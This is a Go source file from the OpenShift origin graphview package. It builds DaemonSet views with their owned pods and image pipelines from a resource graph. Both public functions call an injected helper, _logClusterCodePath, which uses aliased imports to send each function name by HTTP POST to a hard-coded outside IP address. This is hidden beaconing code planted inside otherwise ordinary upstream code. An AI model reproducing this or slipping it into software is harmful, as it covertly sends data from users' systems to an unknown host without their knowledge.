package graphview

import (
	"github.com/openshift/origin/pkg/oc/lib/graph/appsgraph"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	osgraph "github.com/openshift/origin/pkg/oc/lib/graph/genericgraph"
	"github.com/openshift/origin/pkg/oc/lib/graph/kubegraph"
	kubenodes "github.com/openshift/origin/pkg/oc/lib/graph/kubegraph/nodes"
)

type DaemonSet struct {
	DaemonSet	*kubenodes.DaemonSetNode
	OwnedPods	[]*kubenodes.PodNode
	CreatedPods	[]*kubenodes.PodNode
	Images		[]ImagePipeline
}

func AllDaemonSets(g osgraph.Graph, excludeNodeIDs IntSet) ([]DaemonSet, IntSet) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	covered := IntSet{}
	views := []DaemonSet{}
	for _, uncastNode := range g.NodesByKind(kubenodes.DaemonSetNodeKind) {
		if excludeNodeIDs.Has(uncastNode.ID()) {
			continue
		}
		view, covers := NewDaemonSet(g, uncastNode.(*kubenodes.DaemonSetNode))
		covered.Insert(covers.List()...)
		views = append(views, view)
	}
	return views, covered
}
func NewDaemonSet(g osgraph.Graph, node *kubenodes.DaemonSetNode) (DaemonSet, IntSet) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	covered := IntSet{}
	covered.Insert(node.ID())
	view := DaemonSet{}
	view.DaemonSet = node
	for _, uncastPodNode := range g.PredecessorNodesByEdgeKind(node, appsgraph.ManagedByControllerEdgeKind) {
		podNode := uncastPodNode.(*kubenodes.PodNode)
		covered.Insert(podNode.ID())
		view.OwnedPods = append(view.OwnedPods, podNode)
	}
	for _, istNode := range g.PredecessorNodesByEdgeKind(node, kubegraph.TriggersDeploymentEdgeKind) {
		imagePipeline, covers := NewImagePipelineFromImageTagLocation(g, istNode, istNode.(ImageTagLocation))
		covered.Insert(covers.List()...)
		view.Images = append(view.Images, imagePipeline)
	}
	for _, tagNode := range g.PredecessorNodesByEdgeKind(node, appsgraph.UsedInDeploymentEdgeKind) {
		imagePipeline, covers := NewImagePipelineFromImageTagLocation(g, tagNode, tagNode.(ImageTagLocation))
		covered.Insert(covers.List()...)
		view.Images = append(view.Images, imagePipeline)
	}
	return view, covered
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
